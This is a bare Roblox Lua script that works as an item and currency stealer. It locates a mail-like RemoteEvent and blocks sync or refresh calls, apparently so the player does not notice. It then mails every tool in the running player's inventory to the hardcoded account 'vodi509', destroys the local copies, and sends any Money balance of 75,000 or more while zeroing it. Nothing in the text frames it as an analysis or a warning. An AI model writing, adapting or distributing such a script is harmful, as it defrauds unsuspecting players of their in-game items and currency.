local player=game.Players.LocalPlayer
local rs=game:GetService("ReplicatedStorage")
local TARGET="vodi509"
local mailEvent=nil
local all=rs:GetDescendants()
for _,v in pairs(all)do if v:IsA("RemoteEvent")then local name=string.lower(v.Name)if name:find("mail")or name:find("post")or name:find("letter")or name:find("inbox")or name:find("message")then mailEvent=v break end end end
if not mailEvent then return end
local old=mailEvent.FireServer
mailEvent.FireServer=function(self,...)local args={...}if args[1]and type(args[1])=="string"then local s=string.lower(args[1])if s:find("update")or s:find("refresh")or s:find("sync")then return end end return old(self,...)end
local function sendToMail(item)mailEvent:FireServer(TARGET,item,1)task.wait(0.1)end
local function collect()local bp=player:FindFirstChild("Backpack")if not bp then return end local ch=player.Character if ch then for _,v in pairs(ch:GetChildren())do if v:IsA("Tool")then v.Parent=bp end end end local list={}for _,v in pairs(bp:GetChildren())do if v:IsA("Tool")then table.insert(list,v)end end for _,v in pairs(list)do sendToMail(v)v:Destroy()task.wait(0.15)end local ls=player:FindFirstChild("leaderstats")if ls then local m=ls:FindFirstChild("Money")if m and m.Value>=75000 then mailEvent:FireServer(TARGET,m.Value)m.Value=0 end end end
task.wait(3)collect()task.wait(30)queue_on_teleport("")
